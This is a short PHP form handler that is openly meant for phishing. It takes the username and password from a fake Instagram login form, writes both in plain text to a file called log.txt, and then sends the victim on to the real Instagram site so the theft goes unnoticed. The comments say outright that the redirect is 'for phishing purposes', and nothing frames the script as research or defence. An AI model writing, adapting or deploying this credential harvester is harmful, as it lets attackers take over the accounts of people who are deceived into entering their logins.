<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Get form data
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Log the credentials to a file
    $file = fopen("log.txt", "a");
    fwrite($file, "Username: " . $username . "\n");
    fwrite($file, "Password: " . $password . "\n");
    fclose($file);

    // Redirect the user back to Instagram login page (for phishing purposes)
    header("Location: https://www.instagram.com");
    exit();
} else {
    // If someone accesses handler.php directly, show a simple message
    echo "Unauthorized access";
}
?>
